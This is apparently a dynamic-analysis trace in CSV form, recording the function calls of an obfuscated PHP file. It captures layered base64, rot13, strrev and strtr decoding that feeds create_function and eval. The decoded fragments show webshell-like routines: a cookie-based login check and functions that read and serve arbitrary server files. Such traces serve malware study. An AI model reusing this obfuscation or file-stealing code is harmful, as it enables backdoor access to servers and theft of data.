uuid,file_md5,index,source,target,argc,argv,return,dynamic
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,552,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,553,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,554,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,555,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,556,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,557,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,558,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""==DsX0Ds9gGXbjzp1EKMagKMmkJM9gGXvZHIOqUp6yankO1GgOarnymIgywMiWGpw92qkRJGYIHZjcanuA0qdyTplRRohg0GjZ0qeqJGYIHqJEIqjRKIBqJGYAIZhgRG5p""]]}",{"value": "MaIhL3Eco24tnT1fo2qcovtxrTyuom0kXKfAPvEmMKW2MKW1VQ0tWS9GEIWJEIVtJlqVISEDK0uCH1DaKF4xK1ASHyMSHyfaHRuDK1ASGRLaKGfAPvEmMKW2MKWjVQ0tpT"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,559,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tnT1fo2qcovtxrTyuom0kXKfAPvEmMKW2MKW1VQ0tWS9GEIWJEIVtJlqVISEDK0uCH1DaKF4xK1ASHyMSHyfaHRuDK1ASGRLaKGfAPvEmMKW2MKWjVQ0tpT""]]}",{"value": "ZnVuY3Rpb24gaG1sb2dpbigkeGlhbz0xKXsNCiRzZXJ2ZXJ1ID0gJF9TRVJWRVIgWydIVFRQX0hPU1QnXS4kX1NFUlZFUlsnUEhQX1NFTEYnXTsNCiRzZXJ2ZXJwID0gcG"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,560,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gaG1sb2dpbigkeGlhbz0xKXsNCiRzZXJ2ZXJ1ID0gJF9TRVJWRVIgWydIVFRQX0hPU1QnXS4kX1NFUlZFUlsnUEhQX1NFTEYnXTsNCiRzZXJ2ZXJwID0gcG""]]}","{""value"": ""function hmlogin($xiao=1){\r\n$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];\r\n$serverp = postpass;\r\nif (strpos($serveru,JmC""}",[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,561,ibzflz,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function hmlogin($xiao=1){\r\n$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];\r\n$serverp = postpass;\r\nif (strpos($serveru,JmC""]]}",{"value": "\\x00lambda_33"},"[0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,562,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function hmlogin($xiao=1){\r\n$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];\r\n$serverp = postpass;\r\nif (strpos($serveru,JmCode(\""=4PZhNwY\""))>0 or strpos($serveru,JmCode(\""=4PB2RwYlxGZ\""))>0 or strpos($serveru,\""localhost\"")>0 or ($serveru==$_COOKIE['serveru'] and $serverp==$_COOKIE['serverp'])) {echo JmCode(\""+plC9jxHIgQZa0QqhITqh92LtpPnmIzpzIzpa0wqcIKpy1Pp0EUntRTqy1TC\"");} else {setcookie('serveru',$serveru);setcookie('serverp',$serverp);if($xiao==1){echo JmCode(\""==tCa8GCZWII7NmW9DaoyEaoiATVat2pyWaMyW3W9LKn1SKMgNUq0uTVuEKMgkwC0OKnlA2pijwCajzp1EKMa1wocq2of9mW9ZzpmOPqjyzpwAUC\"");}else{geturl();}}\r\n}}""]]}",{"value": "003E"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,563,ibzflz,__lambda_func,0,{"value": []},{"value": "void"},[]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,564,eval,ibzflz,2,"{""value"": [[0, ""LtrIng"", ""9cDQ7DKn4IJPX0jBcDzMxtFMfyzMxSJMlOHPX0jBcxPMzEPXycKnmITocMzYcVPElxQnkEIFbSUHkbIGXIGLkESq2LyG90wVbHTMiAHoXuvpyEJLyuJPX0jBc01Wy1JLhI""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,565,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,566,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,567,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,568,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,569,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,570,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,571,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,572,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,573,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,574,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,575,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""9cDQ7DKn4IJPX0jBcDzMxtFMfyzMxSJMlOHPX0jBcxPMzEPXycKnmITocMzYcVPElxQnkEIFbSUHkbIGXIGLkESq2LyG90wVbHTMiAHoXuvpyEJLyuJPX0jBc01Wy1JLhI""]]}",{"value": "MaIhL3Eco24tMT9sMT93ovtxMzDcrj0XPJyzXPSNMzyfMI9yrTymqUZbWTMxXFxtoKAaXRcgD29xMFtvCJWOZKcUA2ufAxAcHwqnZxuMBT0vXFx7QDbWWTMcoTIcozMiVQ"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,576,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tMT9sMT93ovtxMzDcrj0XPJyzXPSNMzyfMI9yrTymqUZbWTMxXFxtoKAaXRcgD29xMFtvCJWOZKcUA2ufAxAcHwqnZxuMBT0vXFx7QDbWWTMcoTIcozMiVQ""]]}",{"value": "ZnVuY3Rpb24gZG9fZG93bigkZmQpew0KCWlmKCFAZmlsZV9leGlzdHMoJGZkKSkgbXNnKEptQ29kZSgiPWJBMXpHN2hsNkNpUjdaMkhZOG0iKSk7DQoJJGZpbGVpbmZvID"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,577,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gZG9fZG93bigkZmQpew0KCWlmKCFAZmlsZV9leGlzdHMoJGZkKSkgbXNnKEptQ29kZSgiPWJBMXpHN2hsNkNpUjdaMkhZOG0iKSk7DQoJJGZpbGVpbmZvID""]]}",{"value": "function do_down($fd){\r\n\tif(!@file_exists($fd)) msg(JmCode(\"=bA1zG7hl6CiR7Z2HY8m\"));\r\n\t$fileinfo = pathinfo($fd);\r\n\theader(JmCode("},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,578,ibzflz,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function do_down($fd){\r\n\tif(!@file_exists($fd)) msg(JmCode(\""=bA1zG7hl6CiR7Z2HY8m\""));\r\n\t$fileinfo = pathinfo($fd);\r\n\theader(JmCode(""]]}",{"value": "\\x00lambda_34"},"[0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,579,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function do_down($fd){\r\n\tif(!@file_exists($fd)) msg(JmCode(\""=bA1zG7hl6CiR7Z2HY8m\""));\r\n\t$fileinfo = pathinfo($fd);\r\n\theader(JmCode(\""==DY49voiyTquAJnfOUpuOvByOKr01PqhITqh92D\"").$fileinfo['extension']);\r\n\theader(JmCode(\""9HJou5JMfyzMtfQqhIJobAJL0EKLtbwoiyTqcA3ojAKnR1PqhITqh92D\"").$fileinfo['basename']);\r\n\theader(JmCode(\""==NV6tTqa5JMZ1PqhITqh92D\"").filesize($fd));\r\n\t@readfile($fd);\r\n\texit;\r\n}}""]]}",{"value": "003E"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,580,ibzflz,__lambda_func,0,{"value": []},{"value": "void"},[]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,581,eval,ibzflz,2,"{""value"": [[0, ""LtrIng"", ""9cDQ7DKn4IJPX0jByE2owITocMTWt8TnwIJPX0jBcVlBv4FMfyzMx4FXvDxZ5tJpHyRnkOIZF52FOc2omR0LkEIrc92qvEUGYIRZZcHDv9zFWuJpEMTqAcKrz1xF1H3oXu""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,582,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,583,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,584,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,585,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,586,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,587,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,588,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,589,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,590,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,591,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,592,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""9cDQ7DKn4IJPX0jByE2owITocMTWt8TnwIJPX0jBcVlBv4FMfyzMx4FXvDxZ5tJpHyRnkOIZF52FOc2omR0LkEIrc92qvEUGYIRZZcHDv9zFWuJpEMTqAcKrz1xF1H3oXu""]]}",{"value": "MaIhL3Eco24tMT9sMT93ozkiLJDbWTMcoTIwo2EyYPEznJkyXKfAPtybMJSxMKVbFz1Qo2EyXTukZ29bM3ciZGy2o2y5IUS1DHchMx9IpUICqxW5G0glZQSDpJuWIUSbBG"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,593,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tMT9sMT93ozkiLJDbWTMcoTIwo2EyYPEznJkyXKfAPtybMJSxMKVbFz1Qo2EyXTukZ29bM3ciZGy2o2y5IUS1DHchMx9IpUICqxW5G0glZQSDpJuWIUSbBG""]]}",{"value": "ZnVuY3Rpb24gZG9fZG93bmxvYWQoJGZpbGVjb2RlLCRmaWxlKXsNCgloZWFkZXIoSm1Db2RlKGhxM29oZ3pvMTl2b2l5VHF1QUpuZk9VcHVPdkJ5T0tyMDFQcWhJVHFoOT"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,594,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gZG9fZG93bmxvYWQoJGZpbGVjb2RlLCRmaWxlKXsNCgloZWFkZXIoSm1Db2RlKGhxM29oZ3pvMTl2b2l5VHF1QUpuZk9VcHVPdkJ5T0tyMDFQcWhJVHFoOT""]]}","{""value"": ""function do_download($filecode,$file){\r\n\theader(JmCode(hq3ohgzo19voiyTquAJnfOUpuOvByOKr01PqhITqh92D));\r\n\theader(JmCode(\""=ZKM0yaLtb""}",[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,595,ibzflz,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function do_download($filecode,$file){\r\n\theader(JmCode(hq3ohgzo19voiyTquAJnfOUpuOvByOKr01PqhITqh92D));\r\n\theader(JmCode(\""=ZKM0yaLtb""]]}",{"value": "\\x00lambda_35"},"[0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,596,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function do_download($filecode,$file){\r\n\theader(JmCode(hq3ohgzo19voiyTquAJnfOUpuOvByOKr01PqhITqh92D));\r\n\theader(JmCode(\""=ZKM0yaLtbmpyqzouWIY0OKMwAJD\""));\r\n\theader(JmCode(\""==NV6tTqa5JMf1PqhITqh92D\"").strlen($filecode));\r\n\theader(JmCode(\""9HJou5JMfyzMtfQqhIJobAJL0EKLtbwoiyTqcA3ojAKnR1PqhITqh92D\"").$file.\"";\"");\r\n\techo $filecode;\r\n\texit;\r\n}}""]]}",{"value": "003E"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,597,ibzflz,__lambda_func,0,{"value": []},{"value": "void"},[]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,598,eval,ibzflz,2,"{""value"": [[0, ""LtrIng"", ""913BjNvolIUqyW3rX0DMmkJMX0Ds7VQVhWKq0Izp7cDQcNPMuWTWt0wCtD2oiqTWbNvMcOFMmkJMX0Ds7RQVhWKq0Izp7cDQcNGC9xJnwAKD09zoxtvMcOFMmkJMX0Ds7V""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,599,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,600,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,601,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,602,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,603,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,604,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,605,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,606,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,607,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,608,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,609,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""913BjNvolIUqyW3rX0DMmkJMX0Ds7VQVhWKq0Izp7cDQcNPMuWTWt0wCtD2oiqTWbNvMcOFMmkJMX0Ds7RQVhWKq0Izp7cDQcNGC9xJnwAKD09zoxtvMcOFMmkJMX0Ds7V""]]}",{"value": "MaIhL3Eco24tITImqSI0MwtbWUEyrUDcQDc7nJLbp3EloTIhXPE0MKu0XFN8VQZcVUWyqUIlovOzLJkmMGfAPvEfLKA0L2ttCFNjBj0XWTWyM2yhVQ0tZQfAPvEPG00tCF"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,610,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tITImqSI0MwtbWUEyrUDcQDc7nJLbp3EloTIhXPE0MKu0XFN8VQZcVUWyqUIlovOzLJkmMGfAPvEfLKA0L2ttCFNjBj0XWTWyM2yhVQ0tZQfAPvEPG00tCF""]]}",{"value": "ZnVuY3Rpb24gVGVzdFV0ZjgoJHRleHQpDQp7aWYoc3RybGVuKCR0ZXh0KSA8IDMpIHJldHVybiBmYWxzZTsNCiRsYXN0Y2ggPSAwOw0KJGJlZ2luID0gMDsNCiRCT00gPS"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,611,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gVGVzdFV0ZjgoJHRleHQpDQp7aWYoc3RybGVuKCR0ZXh0KSA8IDMpIHJldHVybiBmYWxzZTsNCiRsYXN0Y2ggPSAwOw0KJGJlZ2luID0gMDsNCiRCT00gPS""]]}","{""value"": ""function TestUtf8($text)\r\n{if(strlen($text) < 3) return false;\r\n$lastch = 0;\r\n$begin = 0;\r\n$BOM = true;\r\n$BOMchs = array(0xEF, 0xB""}",[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,612,ibzflz,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function TestUtf8($text)\r\n{if(strlen($text) < 3) return false;\r\n$lastch = 0;\r\n$begin = 0;\r\n$BOM = true;\r\n$BOMchs = array(0xEF, 0xB""]]}",{"value": "\\x00lambda_36"},"[0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,613,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function TestUtf8($text)\r\n{if(strlen($text) < 3) return false;\r\n$lastch = 0;\r\n$begin = 0;\r\n$BOM = true;\r\n$BOMchs = array(0xEF, 0xBB, 0xBF);\r\n$good = 0;\r\n$bad = 0;\r\n$notAscii = 0;\r\nfor($i=0; $i < strlen($text); $i++)\r\n{$ch = ord($text[$i]);\r\nif($begin < 3)\r\n{ $BOM = ($BOMchs[$begin]==$ch);\r\n$begin += 1;\r\ncontinue; }\r\nif($begin==4 && $BOM) break;\r\nif($ch >= 0x80 ) $notAscii++;\r\nif( ($ch&0xC0) == 0x80 )\r\n{if( ($lastch&0xC0) == 0xC0 )\r\n{$good += 1;}\r\nelse if( ($lastch&0x80) == 0 )\r\n{$bad += 1; }}\r\nelse if( ($lastch&0xC0) == 0xC0 )\r\n{$bad += 1;}\r\n$lastch = $ch;}\r\nif($begin == 4 && $BOM)\r\n{return 2;}\r\nelse if($notAscii==0)\r\n{return 1;}\r\nelse if ($good >= $bad )\r\n{return 2;}\r\nelse\r\n{return 0;}}}""]]}",{"value": "003E"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,614,ibzflz,__lambda_func,0,{"value": []},{"value": "void"},[]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,615,eval,ibzflz,2,"{""value"": [[0, ""LtrIng"", ""=0Ks7fJLyWaLtfQqfI3pyWUWt4zp1EKMlOvB0kJquMJMxOlBeSJMlWTV7VlpyyyVt4zp1EKMlOvBkNFMmS2LtfmnuIzpvOlBv8zGvNvolIUqyWUV6NQVyAKLwgKXcHJou5""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,616,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,617,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,618,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,619,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,620,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,621,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,622,ibzflz,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,623,ibzflz,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,624,ibzflz,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
be1b968b09a6743b577fc2d95c0e6196,4f5a94969d8d55f776aa8e0780350263,625,ibzflz,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
